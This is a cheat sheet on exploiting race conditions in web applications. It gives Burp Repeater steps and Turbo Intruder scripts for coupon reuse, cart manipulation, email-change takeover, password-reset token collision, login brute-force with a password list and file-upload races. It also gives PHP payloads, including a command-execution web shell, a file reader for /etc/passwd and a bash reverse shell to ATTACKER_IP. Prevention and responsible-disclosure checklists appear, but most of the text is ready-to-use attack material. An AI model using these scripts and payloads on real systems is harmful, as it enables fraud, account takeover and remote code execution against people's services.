# Race Conditions - Complete Cheat Sheet

## Quick Reference Table

| Attack Type | Use When | Exploit Method | Time | Detection |
|-------------|----------|----------------|------|-----------|
| Limit Overrun | Discount codes, gift cards, rate limits | Parallel identical requests | 5 min | Multiple successes |
| Multi-Endpoint | Shopping cart, order processing | Parallel requests to different endpoints | 10 min | State inconsistency |
| Single-Endpoint | Email change, password reset | Parallel requests with different params | 5 min | Data mismatch |
| Partial Construction | User registration, object creation | Exploit null/uninitialized values | 15 min | Bypass validation |
| Time-Sensitive | Token generation, session creation | Force timestamp collision | 10 min | Identical tokens |
| File Upload | Avatar upload, document processing | Execute before validation completes | 8 min | 200 before 404 |
| Rate Limit Bypass | Login, API calls | Parallel requests before counter updates | 12 min | Multiple attempts succeed |

---

## Complete Payload Reference

### 1. Limit Overrun (Discount Code Reuse)

**Template:**
```http
POST /cart/coupon HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&coupon=PROMO20
```

**Exploitation:**
- Send 20 identical requests in parallel
- All requests pass validation before database updates
- Cart shows multiple discount applications

**Burp Repeater:**
```
1. Create tab group with 20 duplicate requests
2. Right-click group → "Send group in parallel (single-packet attack)"
3. Check responses for multiple successes
```

**Expected Result:**
```http
HTTP/2 200 OK
Content-Length: 3420

<!-- Cart shows: $1337.00 - $267.40 discount = $1069.60 -->
```

### 2. Multi-Endpoint (Cart Manipulation)

**Template:**
```http
# Request 1: Checkout with cheap item
POST /cart/checkout HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

csrf=TOKEN

# Request 2: Add expensive item during validation
POST /cart HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

productId=EXPENSIVE_ITEM&quantity=1
```

**Exploitation:**
- Request 1 validates cheap cart contents
- Request 2 adds expensive item during validation window
- Order confirmation includes both items at cheap price

**Timing:**
```
Connection warming: GET / (5 times)
Then: Send both requests in parallel
Retry: 10-20 times for success
```

### 3. Single-Endpoint (Email Change Collision)

**Template:**
```http
# Request 1: Throwaway email
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

email=throwaway@attacker.com

# Request 2: Target admin email
POST /my-account/change-email HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN

email=admin@target.com
```

**Exploitation:**
- Both requests queue async email tasks
- Task retrieves data from database (race window)
- Confirmation sent to throwaway@ contains admin@ link

**Success Indicator:**
```
Email To: throwaway@attacker.com
Link: /confirm?token=ABC&email=admin@target.com
```

### 4. Partial Construction (Registration Bypass)

**Template:**
```python
# Turbo Intruder Script
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    confirmReq = '''POST /confirm?token[]= HTTP/2
Host: target.com
Cookie: phpsessionid=SESSION
Content-Length: 0

'''

    for attempt in range(20):
        username = 'user' + str(attempt)
        engine.queue(target.req, username, gate=str(attempt))

        # 50 confirmation attempts per registration
        for i in range(50):
            engine.queue(confirmReq, gate=str(attempt))

        engine.openGate(str(attempt))
```

**Registration Request:**
```http
POST /register HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=%s&email=attacker@target.com&password=Password123!
```

**Key Payload:**
```http
POST /confirm?token[]= HTTP/2
# PHP: null == [] evaluates to true during race window
```

### 5. Time-Sensitive (Password Reset Token)

**Template:**
```http
# Request 1: Your account (new session)
POST /forgot-password HTTP/2
Host: target.com
Cookie: session=SESSION_1
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN_1&username=youruser

# Request 2: Target account (different session)
POST /forgot-password HTTP/2
Host: target.com
Cookie: session=SESSION_2
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN_2&username=targetuser
```

**Obtaining Different Sessions:**
```http
GET /forgot-password HTTP/2
Host: target.com
# Response includes new session cookie
```

**Exploitation:**
- Parallel requests processed at same timestamp
- Both tokens generated from same timestamp value
- Tokens are identical for both users

**Token Reuse:**
```
Original: /reset?token=ABC123&username=youruser
Modified: /reset?token=ABC123&username=targetuser
```

### 6. File Upload (Validation Bypass)

**Template:**
```python
# Turbo Intruder Script
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=10,
        requestsPerConnection=100
    )

    # Upload malicious file
    uploadReq = '''POST /upload HTTP/2
Host: target.com
Cookie: session=SESSION_TOKEN
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php echo file_get_contents('/etc/passwd'); ?>
------WebKitFormBoundary--

'''

    # Execute file before deletion
    executeReq = '''GET /uploads/shell.php HTTP/2
Host: target.com

'''

    engine.queue(uploadReq, gate='race1')
    for i in range(5):
        engine.queue(executeReq, gate='race1')

    engine.openGate('race1')
```

**PHP Payloads:**
```php
<!-- Read file -->
<?php echo file_get_contents('/home/carlos/secret'); ?>

<!-- Command execution -->
<?php system($_GET['cmd']); ?>

<!-- Directory listing -->
<?php echo implode("\n", scandir('/home')); ?>

<!-- Reverse shell -->
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

### 7. Rate Limit Bypass (Login Brute-Force)

**Template:**
```python
# Turbo Intruder Script
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    passwords = wordlists.clipboard  # Copy passwords to clipboard first

    for password in passwords:
        engine.queue(target.req, password, gate='1')

    engine.openGate('1')

def handleResponse(req, interesting):
    table.add(req)
```

**Login Request:**
```http
POST /login HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=target&password=%s
```

**Password Wordlist:**
```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
123123
baseball
abc123
football
monkey
letmein
shadow
master
666666
qwertyuiop
```

**Success Indicator:**
```http
HTTP/2 302 Found
Location: /my-account
Set-Cookie: session=NEW_TOKEN
```

---

## Advanced Exploitation Techniques

### HTTP/2 Single-Packet Attack

**Configuration:**
```python
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=1,  # Single connection
    engine=Engine.BURP2       # HTTP/2 support
)
```

**Requirements:**
- Burp Suite 2023.9+
- Target supports HTTP/2
- Single TCP packet contains all requests

**Advantages:**
- Eliminates network jitter
- Maximum timing precision
- Highest success rate

### Last-Byte Synchronization (HTTP/1.1)

**Concept:**
- Withhold last byte of each request
- Send all final bytes simultaneously
- Reduces timing variance

**Implementation:**
```python
engine = RequestEngine(
    endpoint=target.endpoint,
    concurrentConnections=10,
    engine=Engine.THREADED  # HTTP/1.1
)
```

### Connection Warming

**Purpose:** Reduce latency variance

**Method:**
```http
# Send 5 warming requests first
GET / HTTP/2
Host: target.com

# Then execute race attack
POST /api/endpoint HTTP/2
Host: target.com
```

**Effect:**
- First request: ~850ms
- Warmed requests: ~120ms
- More consistent timing

### Session Locking Bypass

**Problem:** PHP/frameworks lock one request per session

**Solution:**
```http
# Request 1: Session A
POST /api HTTP/2
Cookie: session=SESSION_A

# Request 2: Session B
POST /api HTTP/2
Cookie: session=SESSION_B
```

**Obtaining Multiple Sessions:**
```bash
# Browser 1
curl -c cookies1.txt https://target.com/

# Browser 2
curl -c cookies2.txt https://target.com/

# Use different cookies in requests
```

### Gate Mechanism

**Purpose:** Synchronize request release

**Single Gate:**
```python
for i in range(20):
    engine.queue(request, gate='attack1')

engine.openGate('attack1')  # All released simultaneously
```

**Multiple Gates (Staged):**
```python
# Stage 1: Setup
engine.queue(setupReq, gate='stage1')
engine.openGate('stage1')

time.sleep(1)

# Stage 2: Attack
for i in range(20):
    engine.queue(attackReq, gate='stage2')
engine.openGate('stage2')
```

---

## Detection Techniques

### Phase 1: PREDICT

**Identify Vulnerable Endpoints:**
- Operations with limits (rate limits, quotas)
- Single-use resources (coupons, tokens)
- State-dependent actions (checkout, registration)
- Time-sensitive operations (password resets)
- File processing (upload, validation)

**Questions to Ask:**
- Does it check then use a resource?
- Is there a gap between validation and action?
- Does it enforce a limit?
- Is state stored server-side?
- Are operations atomic?

### Phase 2: PROBE

**Baseline Testing:**
```
1. Send request twice sequentially
2. Document expected behavior:
   - Response codes
   - Response lengths
   - Response times
   - Error messages
```

**Race Testing:**
```
1. Create 20 duplicate requests
2. Send in parallel (single-packet)
3. Look for deviations:
   - Multiple successes (expected: 1)
   - Different status codes
   - Different response lengths
   - Timing anomalies
```

**Deviation Examples:**
```
Sequential: 200, 409, 409, 409 (working as designed)
Parallel:   200, 200, 200, 409 (VULNERABLE!)

Sequential: All 3420 bytes
Parallel:   3420, 3567, 3567, 3420 (ANOMALY!)

Sequential: 150ms, 160ms, 155ms, 158ms
Parallel:   145ms, 145ms, 145ms, 145ms (SYNCHRONIZED!)
```

### Phase 3: PROVE

**Consistent Exploitation:**
```
1. Isolate minimal requests
2. Test 10 times
3. Success rate > 50% = exploitable
4. Document impact
5. Create PoC
```

---

## Burp Suite Workflows

### Repeater - Quick Testing

**Setup:**
```
1. Proxy → HTTP history → Right-click → Send to Repeater
2. Repeater → Right-click tab → Add to new tab group
3. Ctrl+Shift+D to duplicate (create 20 tabs)
4. Verify all tabs have same session cookie
5. Update CSRF tokens if needed
```

**Execute:**
```
1. Right-click tab group name
2. "Send group in parallel (single-packet attack)"
3. Analyze responses
4. Sort by: Status code, Length, Time
```

**Analysis:**
```bash
# Look for:
- Multiple 200 responses (expected: 1)
- Different response lengths
- Different error messages
- Timing patterns
```

### Turbo Intruder - Advanced Attacks

**Installation:**
```
Extender → BApp Store → Search "Turbo Intruder" → Install
```

**Basic Usage:**
```
1. Right-click request → Extensions → Turbo Intruder
2. Select payload position (or mark with %s)
3. Choose template:
   - race-single-packet-attack.py (HTTP/2)
   - race-last-byte-sync.py (HTTP/1.1)
4. Customize script if needed
5. Launch attack
```

**Script Templates:**

**Basic Race Condition:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    for i in range(20):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**With Payload Positions:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # %s marks payload position in request
    payloads = ['value1', 'value2', 'value3']

    for payload in payloads:
        engine.queue(target.req, payload, gate='race1')

    engine.openGate('race1')
```

**Clipboard Integration:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    # Reads from clipboard
    payloads = wordlists.clipboard

    for payload in payloads:
        engine.queue(target.req, payload, gate='race1')

    engine.openGate('race1')
```

**Multi-Request Race:**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=1,
        engine=Engine.BURP2
    )

    request1 = '''POST /endpoint1 HTTP/2
Host: target.com

data1
'''

    request2 = '''POST /endpoint2 HTTP/2
Host: target.com

data2
'''

    # Queue both with same gate
    engine.queue(request1, gate='race1')
    engine.queue(request2, gate='race1')

    engine.openGate('race1')
```

---

## Common Patterns & Signatures

### Discount Code Reuse

**Vulnerable Code:**
```python
if not is_used(code):
    apply_discount(code)
    mark_used(code)
```

**Attack Pattern:**
```
20x POST /cart/coupon with same code
```

**Success Signature:**
```
Multiple "Discount applied" responses
Cart total significantly reduced
```

### Login Rate Limit Bypass

**Vulnerable Code:**
```python
if attempts[username] > 3:
    return "Too many attempts"
verify_password(username, password)
attempts[username] += 1
```

**Attack Pattern:**
```
100x POST /login with different passwords
```

**Success Signature:**
```
More than 3 attempts processed
One 302 redirect response
```

### Cart Race Condition

**Vulnerable Code:**
```python
cart = get_cart(session)
if validate_payment(cart.total):
    confirm_order(cart)
```

**Attack Pattern:**
```
Parallel:
  - POST /checkout
  - POST /cart/add (expensive item)
```

**Success Signature:**
```
Order contains items not in validation
Purchase exceeds credit limit
```

### Email Change Collision

**Vulnerable Code:**
```python
async def send_confirmation(user_id, new_email):
    user = get_user(user_id)  # Race window!
    send_email(user.email, token)
```

**Attack Pattern:**
```
Parallel:
  - POST /change-email (email=throwaway)
  - POST /change-email (email=admin)
```

**Success Signature:**
```
Confirmation to throwaway contains admin link
```

### Token Timestamp Collision

**Vulnerable Code:**
```python
token = hash(username + str(time.time()))
```

**Attack Pattern:**
```
Parallel reset requests with different sessions
```

**Success Signature:**
```
Two emails with identical tokens
Token works for both users
```

### File Upload Race

**Vulnerable Code:**
```python
save_file(upload)
scan_result = antivirus.scan(upload)
if scan_result.malicious:
    delete_file(upload)
```

**Attack Pattern:**
```
Parallel:
  - POST /upload (malicious file)
  - GET /uploads/file (5 times)
```

**Success Signature:**
```
One GET returns 200 with file contents
Others return 404 (file deleted)
```

---

## Prevention Checklist

### Code Level

- [ ] Use atomic database operations
- [ ] Implement pessimistic locking (SELECT FOR UPDATE)
- [ ] Add unique constraints to database
- [ ] Use optimistic locking (version fields)
- [ ] Implement distributed locks (Redis)
- [ ] Use idempotency keys
- [ ] Avoid check-then-use patterns
- [ ] Eliminate sub-states

### Architecture Level

- [ ] Single-threaded processing for critical operations
- [ ] Message queues for serialization
- [ ] Event sourcing instead of mutable state
- [ ] Immutable data structures
- [ ] SERIALIZABLE transaction isolation
- [ ] Database-level constraints

### Testing

- [ ] Stress test with concurrent requests
- [ ] Use ThreadSanitizer / similar tools
- [ ] Static analysis for race conditions
- [ ] Monitor for duplicate operations
- [ ] Alert on anomalies

---

## Troubleshooting Guide

### Problem: No Collision Detected

**Check:**
- [ ] Using parallel sending (not sequential)?
- [ ] Same session cookie in all requests?
- [ ] Valid CSRF tokens?
- [ ] HTTP/2 enabled on target?
- [ ] Burp Suite 2023.9+?
- [ ] Enough requests (try 50-100)?

**Try:**
```python
# Increase concurrency
engine = RequestEngine(
    concurrentConnections=10,
    requestsPerConnection=100
)
```

### Problem: Session Locking

**Symptoms:**
```
Sequential processing despite parallel sending
Long delays between responses
```

**Solution:**
```python
# Use different sessions
sessions = ['session1', 'session2', 'session3']
for i, sess in enumerate(sessions):
    req = request.replace('session=OLD', f'session={sess}')
    engine.queue(req, gate='race')
```

### Problem: Rate Limiting

**Symptoms:**
```
"Too many requests" errors
IP-based blocking
Account lockout
```

**Solution:**
```python
# Slow down between attempts
for i in range(20):
    engine.queue(req, gate=str(i))
    engine.openGate(str(i))
    time.sleep(1)
```

### Problem: CSRF Validation

**Symptoms:**
```
All requests return "Invalid CSRF token"
```

**Solution:**
```
1. Get fresh CSRF token from form
2. Update all requests immediately
3. Work quickly before expiration
4. Consider session-based CSRF (not time-based)
```

### Problem: Inconsistent Results

**Symptoms:**
```
Works sometimes, fails other times
Success rate < 10%
```

**Solution:**
```python
# Add connection warming
for i in range(5):
    engine.queue(warmupRequest)

engine.start()
time.sleep(2)

# Now execute attack
for i in range(20):
    engine.queue(attackRequest, gate='race')
engine.openGate('race')
```

---

## Common Mistakes

### Mistake 1: Sequential Requests

**Wrong:**
```python
for i in range(20):
    engine.queue(request)
    engine.start()  # Don't start in loop!
```

**Correct:**
```python
for i in range(20):
    engine.queue(request, gate='race1')

engine.openGate('race1')  # Start all at once
```

### Mistake 2: Different Sessions

**Wrong:**
```
Request 1: Cookie: session=ABC
Request 2: Cookie: session=XYZ
Result: No collision (different users)
```

**Correct:**
```
Request 1: Cookie: session=ABC
Request 2: Cookie: session=ABC
Result: Collision possible
```

### Mistake 3: Missing Request Termination

**Wrong:**
```python
request = '''POST /api HTTP/2
Host: target.com

data=value'''  # Missing \r\n\r\n
```

**Correct:**
```python
request = '''POST /api HTTP/2
Host: target.com

data=value

'''  # Ends with \r\n\r\n
```

### Mistake 4: Insufficient Volume

**Wrong:**
```python
for i in range(5):  # Too few!
    engine.queue(request, gate='race')
```

**Correct:**
```python
for i in range(50):  # Enough for narrow windows
    engine.queue(request, gate='race')
```

### Mistake 5: Ignoring State

**Wrong:**
```
Attempt 1: Success
Attempt 2: Failure (state changed!)
```

**Correct:**
```
1. Reset application state between attempts
2. Use different test accounts
3. Clear cart/sessions
```

---

## Quick Win Checklist

### High-Value Targets

**Shopping Carts:**
- [ ] Discount code application
- [ ] Gift card redemption
- [ ] Cart modification during checkout
- [ ] Price manipulation
- [ ] Quantity limits bypass

**Authentication:**
- [ ] Login rate limiting
- [ ] Password reset tokens
- [ ] 2FA bypass
- [ ] Session creation
- [ ] Account lockout

**Financial:**
- [ ] Fund transfers
- [ ] Balance checks
- [ ] Withdrawal limits
- [ ] Payment processing
- [ ] Refund requests

**User Management:**
- [ ] Email changes
- [ ] Profile updates
- [ ] Account creation
- [ ] Permission assignments
- [ ] Role changes

**File Operations:**
- [ ] File uploads
- [ ] Avatar changes
- [ ] Document processing
- [ ] Antivirus scanning
- [ ] File validation

---

## Essential Tools

### Burp Suite Extensions

1. **Turbo Intruder** (Required)
   - BApp Store installation
   - Python scripting engine
   - HTTP/2 support

2. **Collaborator Client**
   - Out-of-band detection
   - DNS/HTTP callbacks
   - Timing analysis

3. **Logger++**
   - Request/response logging
   - Pattern matching
   - Timing analysis

### Command-Line Tools

```bash
# Parallel requests with curl
parallel -j 20 curl -X POST https://target.com/api \
  -H "Cookie: session=TOKEN" \
  -d "param=value" ::: {1..20}

# Apache Bench
ab -n 100 -c 20 -H "Cookie: session=TOKEN" \
  -p payload.txt https://target.com/api

# Custom Python script
import concurrent.futures
import requests

def attack():
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(requests.post, url, data=data)
                  for _ in range(20)]
        results = [f.result() for f in futures]
```

---

## Testing Scripts

### Python Race Condition Tester

```python
import concurrent.futures
import requests
import time

def test_race_condition(url, data, headers, num_requests=20):
    """
    Test endpoint for race conditions
    """
    results = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_requests) as executor:
        futures = [
            executor.submit(requests.post, url, data=data, headers=headers)
            for _ in range(num_requests)
        ]

        for future in concurrent.futures.as_completed(futures):
            try:
                response = future.result()
                results.append({
                    'status': response.status_code,
                    'length': len(response.content),
                    'time': response.elapsed.total_seconds()
                })
            except Exception as e:
                results.append({'error': str(e)})

    # Analysis
    success_count = sum(1 for r in results if r.get('status') == 200)
    print(f"Success count: {success_count}/{num_requests}")

    if success_count > 1:
        print("⚠️  POTENTIAL RACE CONDITION DETECTED")

    return results

# Usage
url = "https://target.com/api/endpoint"
data = {"param": "value"}
headers = {"Cookie": "session=TOKEN"}

test_race_condition(url, data, headers)
```

### Bash Race Condition Tester

```bash
#!/bin/bash

URL="https://target.com/api/endpoint"
COOKIE="session=TOKEN"
DATA="param=value"
REQUESTS=20

echo "Testing race condition..."

for i in $(seq 1 $REQUESTS); do
    curl -X POST "$URL" \
        -H "Cookie: $COOKIE" \
        -d "$DATA" \
        -s -o "response_$i.txt" \
        -w "%{http_code}\n" >> status_codes.txt &
done

wait

# Analysis
success_count=$(grep -c "200" status_codes.txt)
echo "Successful requests: $success_count/$REQUESTS"

if [ $success_count -gt 1 ]; then
    echo "⚠️  POTENTIAL RACE CONDITION DETECTED"
fi

# Cleanup
rm response_*.txt status_codes.txt
```

---

## Response Analysis

### Identifying Anomalies

**Status Code Analysis:**
```python
# Burp Repeater: Sort by status code
# Look for multiple successes when expecting one

Expected: [200, 409, 409, 409, 409]
Anomaly:  [200, 200, 200, 409, 409]  ⚠️
```

**Response Length Analysis:**
```python
# Sort by length in Burp
# Different lengths indicate different responses

Expected: [3420, 3420, 3420, 3420]
Anomaly:  [3420, 3567, 3567, 3420]  ⚠️
```

**Timing Analysis:**
```python
# Synchronized timing indicates simultaneous processing

Sequential: [150ms, 160ms, 155ms, 158ms]
Parallel:   [145ms, 145ms, 145ms, 145ms]  ✓
```

**Content Difference:**
```bash
# Save responses and diff
diff response1.txt response2.txt

# Look for:
- Different error messages
- Different data returned
- Different state reflected
```

---

## Real-World Examples

### Example 1: E-Commerce Coupon Bypass

**Target:** Online store with 20% discount code
**Vulnerability:** Coupon validation not atomic
**Exploit:** Apply same coupon 20 times in parallel
**Impact:** 400% discount (free items)

### Example 2: Login Rate Limit Bypass

**Target:** Admin login with 3-attempt limit
**Vulnerability:** Counter incremented after processing
**Exploit:** 100 parallel login attempts with password list
**Impact:** Full credential brute-force

### Example 3: Banking Transfer

**Target:** Money transfer endpoint
**Vulnerability:** Balance check not locked
**Exploit:** Multiple transfers read same balance
**Impact:** Withdraw more than account balance

### Example 4: Email Verification Bypass

**Target:** Registration requiring email confirmation
**Vulnerability:** Token null during object creation
**Exploit:** Confirm with empty token during registration
**Impact:** Register without email ownership

### Example 5: File Upload RCE

**Target:** Avatar upload with antivirus scanning
**Vulnerability:** File accessible before scan completes
**Exploit:** Upload PHP shell, execute before deletion
**Impact:** Remote code execution

---

## Final Checklist

### Before Testing

- [ ] Burp Suite Professional 2023.9+
- [ ] Turbo Intruder installed
- [ ] HTTP/2 support verified
- [ ] Test credentials obtained
- [ ] Baseline behavior documented
- [ ] Legal authorization confirmed

### During Testing

- [ ] Start with sequential requests (baseline)
- [ ] Use parallel requests (race condition)
- [ ] Document all deviations
- [ ] Try multiple timing approaches
- [ ] Test 10-20 times for consistency
- [ ] Record success rate

### After Finding Vulnerability

- [ ] Confirm exploitability
- [ ] Document impact
- [ ] Create PoC
- [ ] Estimate severity
- [ ] Report responsibly
- [ ] Follow disclosure policy
